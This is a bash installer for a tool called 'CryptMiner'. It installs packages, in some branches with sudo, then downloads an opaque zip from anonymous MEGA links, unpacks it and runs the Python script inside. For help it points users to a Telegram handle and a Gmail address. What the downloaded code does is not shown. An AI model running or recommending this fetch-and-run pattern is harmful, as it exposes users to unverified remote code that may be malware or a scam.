#!/bin/bash

GREEN='\033[1;32m'
YELLOW='\033[1;33m'
NC='\033[0m'

echo -e "${GREEN}Setting up CryptMiner...${NC}\n"

PC_MEGA="https://mega.nz/file/zAMVybpY#JD5tbjfDEGo-ySUCmvTEkA8b1-msdSV6YxS6k4s3eNA"
TERMUX_64_MEGA="https://mega.nz/file/mQMQST6a#a_1ecolTIk6p03jFoINkzf-wFpABHl8ocQXQ5dTMHhQ"
TERMUX_32_MEGA="https://mega.nz/file/LdNwGKIC#89Mq6vcbDnSQpM4M2NLr4nuPv07AD1K_uWoH5foAIik"

if [ -d "/data/data/com.termux" ]; then
    pkg update -y && pkg upgrade -y
    pkg install -y python rust ruby megatools
    pip install requests pyfiglet
    gem install lolcat
    
    ARCH=$(uname -m)
    if [[ $ARCH == "aarch64" ]]; then
        MEGA_URL=$TERMUX_64_MEGA
    else
        MEGA_URL=$TERMUX_32_MEGA
    fi
    PYTHON_CMD="python"

elif [[ "$OSTYPE" == "darwin"* ]]; then
    echo -e "${YELLOW}Setup for MacOS${NC}"
    if ! command -v brew &> /dev/null; then
        echo "Installing Homebrew..."
        /bin/bash -c "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/HEAD/install.sh)"
    fi
    brew install python3 lolcat megatools
    MEGA_URL=$PC_MEGA
    PYTHON_CMD="venv/bin/python"

else
    echo -e "${YELLOW}Setup for Linux/WSL${NC}"
    sudo apt-get update
    sudo apt-get install -y python3 python3-pip ruby megatools
    sudo gem install lolcat
    MEGA_URL=$PC_MEGA
    PYTHON_CMD="venv/bin/python"
fi

echo -e "⬇️ Downloading CryptMiner..."
megadl "$MEGA_URL" --path .

for f in *.zip; do
    unzip "$f"
    rm "$f"
done

for d in */ ; do
    mv "$d"* .
    rm -r "$d"
done

if [ ! -d "/data/data/com.termux" ]; then
    python3 -m venv venv
    source venv/bin/activate
    pip install requests pyfiglet pyperclip
fi

echo -e "\n${GREEN}Done ✅! Running CryptMiner...${NC}\n"
$PYTHON_CMD cryptminer.py || {
    echo -e "\n${YELLOW}[!] Couldn't run CryptMiner on your device at the moment, message us to solve it!"
    echo "Copy error/Send a screenshot for help:"
    echo "Telegram: @CryptMinerAdmin"
    echo -e "Email address: cryptminer.team@gmail.com${NC}\n"
    exit 1
}
